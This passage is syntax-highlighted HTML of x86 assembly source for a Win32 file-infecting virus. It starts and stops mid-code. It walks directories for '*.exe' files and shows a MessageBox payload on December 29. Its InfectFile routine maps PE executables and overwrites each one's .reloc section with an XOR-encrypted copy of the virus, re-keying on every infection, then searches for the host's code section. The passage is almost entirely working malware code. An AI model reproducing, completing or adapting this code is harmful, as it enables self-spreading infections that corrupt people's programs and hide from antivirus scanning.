    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_file</span><span class="sc0">
</span><span class="sc5">nxt_dir</span><span class="sc4">:</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">max_dirs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">s_files</span><span class="sc0">
</span><span class="sc5">r_dir</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;check for payload:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wMonth</span><span class="sc4">],</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">reth</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">1dh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">reth</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32dll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">reth</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">reth</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirusCopyRight</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">reth</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;mov eax,fs:[00000000]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    </span><span class="sc5">SYSTEMTIME</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">wYear</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMonth</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDayOfWeek</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDay</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wHour</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMinute</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wSecond</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMilliseconds</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">user32dll</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"user32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MessageBox</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
    </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
    
    
    </span><span class="sc5">hfind</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">max_dirs</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc5">search_mask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dotdot</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cdir</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    
    </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwReserved0</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwReserved1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">decrypt_key</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;create new key</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitInfect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">close_f</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">close_m</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;check for valid pe file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc1">;goto sections table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get number of sections</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc1">;get image base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Virus_Start</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;save image base insaid decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc1">;get number of datadirectory</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;eax - sections table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;ecx - number of sections</span><span class="sc0">
    </span><span class="sc1">;check for reloc section</span><span class="sc0">
</span><span class="sc5">@sec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"ler."</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_sec</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc3">"cole"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_rec</span><span class="sc0">
</span><span class="sc5">nxt_sec</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@sec</span><span class="sc0">
</span><span class="sc5">ext_rlc</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">  </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc1">;check if the reloc section is bigger than virus</span><span class="sc0">
</span><span class="sc5">f_rec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc5">virus_size</span><span class="sc0"> </span><span class="sc1">;eax - reloc section header !</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ext_rlc</span><span class="sc0">
    </span><span class="sc1">;set new section flags</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0c0000020h</span><span class="sc0"> </span><span class="sc1">;code\readable\writeable</span><span class="sc0">
    </span><span class="sc1">;goto the section raw data:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;overwrite the reloc section with the virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
</span><span class="sc5">@enc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">decrypt_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@enc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;ecx - number of sections</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;ebx - sections table</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Virus_Start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;eax - virus start infected files</span><span class="sc0">
</span><span class="sc5">@sec2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc3">"txet"</span><span class="sc0"> </span><span class="sc1">;text ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_cod</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc3">"edoc"</span><span class="sc0"> </span><span class="sc1">;code ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_cod</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc3">"EDOC"</span><span class="sc0">  </span><span class="sc1">;CODE ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">f_cod</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@sec2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">  </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc1">;ebx - code section header</span><span class="sc0">
</span><span class="sc5">f_cod</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ecx - size of section raw data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;edx - virtual section size</span><span class="sc0">
